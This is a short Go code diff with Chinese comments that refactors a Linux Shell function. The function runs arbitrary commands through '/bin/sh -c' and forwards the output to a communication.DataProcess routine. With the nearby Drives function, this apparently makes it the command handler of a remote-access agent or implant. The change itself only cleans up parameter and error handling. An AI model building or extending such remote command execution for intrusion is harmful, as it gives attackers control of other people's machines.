@@ -94,8 +94,9 @@ func Drives() ([]byte, error) {
 	return []byte("/"), nil
 }
 
-func Shell(path string, args []byte) ([]byte, error) {
-	path = "/bin/sh"
+// Shell 在 Linux 侧始终使用 /bin/sh（形参 path 保留以与 Windows 实现签名一致）
+func Shell(_ string, args []byte) ([]byte, error) {
+	path := "/bin/sh"
 	argsArray := []string{"-c", string(args)}
 	cmd := exec.Command(path, argsArray...)
 	stdout, err := cmd.StdoutPipe()
@@ -111,7 +112,9 @@ func Shell(path string, args []byte) ([]byte, error) {
 	var count int
 	time.Sleep(500 * time.Millisecond)
 	buf = make([]byte, 1024*50)
-	count, err = stdout.Read(buf)
+	// 首次读取的错误刻意忽略：shell 立即退出时此处即 EOF，
+	// 下面循环会读到同一错误并正常收尾（原行为）
+	count, _ = stdout.Read(buf)
 	communication.DataProcess(0, buf[:count])
 	for {
 		buf = make([]byte, 1024*50)
